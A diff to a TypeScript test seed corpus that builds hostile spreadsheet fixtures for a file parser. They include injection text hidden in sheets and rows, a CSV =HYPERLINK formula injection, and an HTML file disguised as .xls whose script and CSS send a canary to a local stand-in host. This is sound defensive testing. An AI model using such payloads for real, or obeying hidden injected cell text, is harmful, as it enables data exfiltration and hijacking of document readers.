@@ -78,8 +78,14 @@ export function seedCorpus(): Seed[] {
     { name: 'hidden-sheet-injection.xlsx', target: 'sheet', expect: { ignore: ['hidden_sheets_skipped'] }, bytes: () => writeXlsx([{ name: 'S', rows: plainRows }, { name: '숨김', hidden: true, rows: [[INJECTION]] }]) },
     { name: 'hidden-row-injection.xlsx', target: 'sheet', expect: { ignore: ['hidden_rows_skipped'] }, bytes: () => writeXlsx([{ name: 'S', rows: [...plainRows, [INJECTION, 1, 1]], hiddenRows: [2] }]) },
     { name: 'csv-formula-injection.csv', target: 'sheet', expect: { ignore: ['formula_like_text'] }, bytes: async () => enc.encode(`정산기준일,주문금액,정산금액\n2026-10-01,"=HYPERLINK(""http://127.0.0.1:9"",""${CANARY}"")",9000\n`) },
-    { name: 'xls-legacy.xls', target: 'sheet', expect: { reject: ['unsupported_format'] }, bytes: async () => new Uint8Array([0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1, ...new Uint8Array(504)]) },
-    { name: 'html-disguised.xls', target: 'sheet', expect: { reject: ['unsupported_format'] }, bytes: async () => enc.encode(`<html><body><table><tr><td>${CANARY}</td></tr></table><img src="http://127.0.0.1:9/x.png"></body></html>`) },
+    { name: 'xls-broken-header.xls', target: 'sheet', expect: { reject: ['sheet_invalid'] }, bytes: async () => new Uint8Array([0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1, ...new Uint8Array(504)]) },
+    { name: 'html-no-table.xls', target: 'sheet', expect: { reject: ['unsupported_format'] }, bytes: async () => enc.encode(`<html><body><p>${CANARY}</p><img src="http://127.0.0.1:9/x.png"></body></html>`) },
+    {
+      name: 'html-disguised.xls',
+      target: 'sheet',
+      expect: { ignore: [] },
+      bytes: async () => enc.encode(`<html><head><script>fetch('http://127.0.0.1:9/js?${CANARY}')</script><style>td{background:url(http://127.0.0.1:9/css)}</style></head><body><!-- ${CANARY} --><table><tr><td>정산기준일</td><td>주문금액<script>${CANARY}</script></td></tr><tr><td>2026-10-01</td><td>9000</td></tr></table><img src="http://127.0.0.1:9/x.png"></body></html>`),
+    },
     { name: 'csv-utf16.csv', target: 'sheet', expect: { reject: ['unsupported_format', 'text_decode_failed'] }, bytes: async () => new Uint8Array([0xff, 0xfe, 0x41, 0x00]) },
     { name: 'csv-unclosed-quote.csv', target: 'sheet', expect: { reject: ['sheet_too_large'] }, bytes: async () => enc.encode(`a,"${repeat('x', 40_000)}`) },
     // ── 그림 ──
